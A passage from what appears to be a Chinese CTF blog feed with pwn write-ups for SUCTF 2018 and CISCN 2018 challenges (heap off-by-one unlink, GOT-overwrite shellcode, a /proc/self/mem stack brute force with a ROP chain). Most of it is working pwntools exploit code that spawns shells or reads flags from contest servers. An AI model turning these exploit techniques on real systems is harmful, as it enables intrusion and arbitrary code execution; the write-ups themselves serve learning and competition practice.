class="line">            <span class="keyword">if</span> byte &gt;&gt; i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            bit = (byte &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">            write_mem(p, addr + i*<span class="number">4</span>, bit)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># for i in range(34, 256):</span></span><br><span class="line">    <span class="comment">#     print i</span></span><br><span class="line">    <span class="comment">#     write_byte(i)    </span></span><br><span class="line">    <span class="comment">#     print p.recvline_contains('lock')</span></span><br><span class="line"></span><br><span class="line">    write_byte(<span class="number">35</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Box:'</span>)</span><br><span class="line">    func_flag = int(p.recvline().strip(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'func_addr is '</span>, hex(func_flag)</span><br><span class="line">    p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">    <span class="comment"># p.sendline('a'*offset +  p64(canary) + p64(func_addr))</span></span><br><span class="line">    p.recvuntil(<span class="string">'want?'</span>)</span><br><span class="line">    p.sendline(<span class="string">'b'</span>*<span class="number">0x1A</span> + p64(canary)*<span class="number">2</span> + p64(func_flag)*<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    pwn(i)</span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">free_got=<span class="number">0x602018</span></span><br><span class="line">ptr=<span class="number">0x6020c0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./offbyone'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p= remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20004</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input len\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.send(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'4:edit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input id\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'input your data\n'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'a'</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur2'</span>.ljust(<span class="number">128</span>,<span class="string">'b'</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'d'</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">136</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">136</span>,<span class="string">'e'</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'f'</span>))<span class="comment">#6</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">'hack by 0gur1'</span>.ljust(<span class="number">128</span>,<span class="string">'g'</span>))<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x81</span>) +p64(ptr+<span class="number">40</span><span class="number">-24</span>)+p64(ptr+<span class="number">40</span><span class="number">-16</span>)</span><br><span class="line">payload= fake_chunk</span><br><span class="line">payload= payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">'\x90'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x18\x20\x60'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">sys_addr = free_addr-(libc.symbols[<span class="string">'free'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="noend"><a href="#noend" class="headerlink" title="noend"></a>noend</h1><p>to be continue ..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/SUCTF2018/0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;note&quot;&gt;&lt;a href=&quot;#note&quot; class=
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</title>
    <link href="http://p4nda.top/2018/05/13/ciscn-ctf-2018/"/>
    <id>http://p4nda.top/2018/05/13/ciscn-ctf-2018/</id>
    <published>2018-05-13T06:52:14.000Z</published>
    <updated>2018-05-13T09:18:10.440Z</updated>
    
    <content type="html"><![CDATA[<p>​    拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。</p><p><img src="/img/ciscn/0.png" alt=""></p><p>​    最后做出来和复现的有三道：note-service2  、 house_of_grey 、 echo_back</p><h1 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h1><p>这道题给出的hint是</p><p><img src="/img/ciscn/1-1.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>大致分析了一下题目，题目主要提供了add、delete两个函数：</p><p><img src="/img/ciscn/1-2.png" alt="add函数"></p><p><img src="/img/ciscn/1-3.png" alt="delete函数"></p><p>可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，<strong>在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题</strong>。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>具体思路我曾经写过blog： <a href="http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）" target="_blank" rel="noopener">http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...）</a></p><p>思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">context.update(arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_note_service2_OG37AWm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">31128</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">add((elf.got[<span class="string">'free'</span>]<span class="number">-0x2020A0</span>)/<span class="number">8</span>,asm(<span class="string">'xor rsi,rsi'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">'push 0x3b\n pop rax'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">'xor rdx,rdx'</span>)+<span class="string">'\x90\x90\xe9\x16'</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">'syscall'</span>)+<span class="string">'\x90'</span>*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-grey"><a href="#house-of-grey" class="headerlink" title="house_of_grey"></a>house_of_grey</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数</p><p><img src="/img/ciscn/2-1.png" alt="main"></p><p>在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。</p><p><img src="/img/ciscn/2-2.png" alt="功能"></p><p>漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。</p><p><img src="/img/ciscn/2-3.png" alt="漏洞"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。</p><p>但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。</p><p>另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。</p><p>这种想法遇到的一个问题是如何拿到随机化的栈地址？</p><p>此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。</p><p>可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。</p><p>另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line"><span class="comment">#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./task_house_P4U73bf'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Y/n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'10000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">pie = int(<span class="string">'0x'</span>+p.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie:'</span>,hex(pie)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'heap'</span> <span class="keyword">in</span> a:</span><br><span class="line">a = p.recvline()</span><br><span class="line">stack_start = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">stack_end = int((a.split(<span class="string">'-'</span>)[<span class="number">1</span>]).split(<span class="string">' '</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_start:'</span>,hex(stack_start)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack_end:'</span>,hex(stack_end)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'libc'</span> <span class="keyword">in</span> a:</span><br><span class="line">libc.address = int(a.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'you?'</span>)</span><br><span class="line">stack_guess = <span class="number">0xf800000</span></span><br><span class="line">p.sendline(str(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] offset from '</span>,hex( stack_guess + <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_guess)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] from '</span>,hex(stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span>),<span class="string">'to'</span>,hex(stack_end - stack_guess)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span>):</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'get?'</span>)</span><br><span class="line">p.sendline(<span class="string">'100000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something:\n'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'1.Find '</span>)[:<span class="number">-7</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">'/mem'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+++] find'</span></span><br><span class="line"><span class="keyword">print</span> tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>]</span><br><span class="line">canary = u64(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>][<span class="number">-0x48</span>:<span class="number">-0x40</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">stack_address = stack_end - stack_guess - <span class="number">24</span>*<span class="number">100000</span> + i *<span class="number">100000</span> + len(tmp.split(<span class="string">'/proc/self/mem'</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> canary==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] fail'</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] canary :'</span>,hex(canary)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_address)</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'finding?'</span>)</span><br><span class="line">p.sendline(<span class="string">'/proc/self/mem'</span>+<span class="string">'\x00'</span>*(<span class="number">0x18</span><span class="number">-14</span>)+p64(stack_address<span class="number">-56</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Exit'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">rop =p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pie+elf.symbols[<span class="string">'open'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(<span class="number">6</span>)+p64(pie+<span class="number">0x0000000000001821</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'read'</span>])+p64(pie+<span class="number">0x0000000000001823</span>)+p64(stack_address<span class="number">-56</span>+<span class="number">0x100</span>)+p64(pie+elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">rop +=<span class="string">'a'</span>*(<span class="number">0x100</span>-len(rop))</span><br><span class="line">rop += <span class="string">'/home/ctf/flag\0'</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hex(-0x7fb165afd580 +0x7fb174d53000)  0xf255a80</span></span><br><span class="line"><span class="string">hex(-0x7f810afe4db0 + 0x7f811af62000) 0xff7d250</span></span><br><span class="line"><span class="string">hex(-0x7fe3844beeb0 + 0x7fe394428000) 0xff69150</span></span><br><span class="line"><span class="string">hex(-0x7f73844633a0 + 0x7f73940a9000) 0xfc45c60</span></span><br><span class="line"><span class="string">0x0000000000001823 : pop rdi ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000001821 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a </span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x49 bytes:</span></span><br><span class="line"><span class="string">    00000000  23 28 99 7f  32 56 00 00  20 2f 20 00  00 00 00 00  │#(··│2V··│ / ·│····│</span></span><br><span class="line"><span class="string">    00000010  00 0b 00 00  00 00 00 00  23 28 99 7f  32 56 00 00  │····│····│#(··│2V··│</span></span><br><span class="line"><span class="string">    00000020  70 2f 20 00  00 00 00 00  00 0b 00 00  00 00 00 00  │p/ ·│····│····│····│</span></span><br><span class="line"><span class="string">    00000030  23 28 99 7f  32 56 00 00  30 